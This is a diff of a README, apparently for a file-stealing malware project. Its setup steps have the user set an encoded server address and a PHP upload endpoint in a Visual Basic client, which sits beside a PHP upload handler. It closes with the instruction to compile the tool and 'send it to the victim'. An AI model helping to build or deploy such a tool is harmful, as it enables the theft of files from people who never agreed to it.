@@ -38,9 +38,12 @@ move_uploaded_file($_FILES["file"]["tmp_name"],
 unlink($del);
 ?>
 ```
- - Open the project in Visual Studio and edit the below variable in source code 
+ - Open the project in Visual Studio and the edit below variable in source code 
 ```
 Dim server As String = BaseDecode1("your server address here in base64 encoded") 
 ```
-
-
+ - and edit this variable below as well
+```
+Dim php As String = "yourphpfilename.php?" & "folder="
+```
+ - Just compile it and send it to the victim thats all !!
